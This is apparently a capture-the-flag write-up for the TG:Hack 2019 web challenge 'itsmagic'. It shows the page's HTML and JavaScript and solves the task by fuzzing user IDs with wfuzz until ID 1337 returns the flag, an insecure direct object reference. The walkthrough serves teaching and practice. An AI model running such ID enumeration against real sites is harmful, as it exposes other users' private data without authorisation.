---
layout: menu
---

![itsmagic (100 pts)](./screenshots/itsmagic.png)

---

## CHALLENGE INFO
- __CHALLENGE LINK__: https://wandshop.tghack.no/
- __LANDING PAGE__:

  ![homepage](./screenshots/itsmagic_home.png)

  - __Page Source__:
    ```html
    <html>

    <head>
      <title>itsmagic</title>
      <script type="text/javascript" src="script.js"></script>
      <link rel="stylesheet" href="style.css">
    </head>

    <body onload="init()" class="orangebackground">
      <header>
        <img class="logo" src="/pictures/itsmagic_2.png" alt="itsmagic logo">
      </header>
      <div class="login-page">
        <div class="form">
          <form class="login-form">
            <input type="text" id="username" placeholder="username" />
            <input type="password" id="password" placeholder="password" />
            <input type="button" id="myBtn" value="Login" onclick="login()" />
          </form>
        </div>
      </div>
      <div class="homecontainer">
        <img src="/pictures/orange_itsmagic.jpg">
      </div>
    </body>

    </html>
    ```
  - __*/script.js*__
    ```js
    const rooturl = window.location.protocol+"//"+window.location.host+"/";

    function init() {
        ...
    }

    function login() {
        // Nothing interesting here, just trying to make task seem like 
        // it has a real login page in a hacky way
        var username = document.getElementById('username').value;

        var request = new XMLHttpRequest();
        request.open('GET', rooturl + 'login/' + username);

        request.onload = function () {
            var data = JSON.parse(this.response);
            const userid = data.userid;

            if (request.status == 200 && userid != null)
                window.location.href = rooturl + "home/" + userid;
        }

        request.send();
    }

    function home() {
        // Just selecting grades randomly to illustrate that each user 
        // has their own grades (giving the feel of a real website)

        ...

        request.send();
    }

    ```

    __Notes__:
    - The __login form__ is bogus
    - The grades generated after "logging in" is randomly generated
    - The default __userid__ after "logging in" is 1338

- __ASSUMED OBJECTIVE__: Find the __userid__ where the flag is hidden

---

## Step 1 : Find the __userid__ with the flag

1. Run __*wfuzz*__:
   ```console
   wfuzz -z range,0-9999 https://itsmagic.tghack.no/home/FUZZ

   # ==================================================================
   # ID   Response   Lines      Word         Chars          Payload
   # ==================================================================
   # ...
   # 001330:  C=200     43 L       74 W          936 Ch    "1329"
   # 001332:  C=200     43 L       74 W          936 Ch    "1331"
   # 001334:  C=200     43 L       74 W          936 Ch    "1333"
   # 001333:  C=200     43 L       74 W          936 Ch    "1332"
   # 001335:  C=200     43 L       74 W          936 Ch    "1334"
   # 001337:  C=200     43 L       74 W          936 Ch    "1336"
   # 001336:  C=200     43 L       74 W          936 Ch    "1335"
   # 001338:  C=200      0 L       10 W           76 Ch    "1337"
   # 001339:  C=200     43 L       74 W          936 Ch    "1338"
   # 001340:  C=200     43 L       74 W          936 Ch    "1339"
   # ...
   ```
   __Note__:
   - __userid 1337__ has a different content length than the rest.

2. Check __userid 1337__:
   ```console
   curl https://itsmagic.tghack.no/home/1337
   ```
   ```html
   Congrats, y0ur s0 1337! </br>TG19{Direct object reference might B insecure!}
   ```

---

## FLAG : __TG19{Direct object reference might B insecure!}__
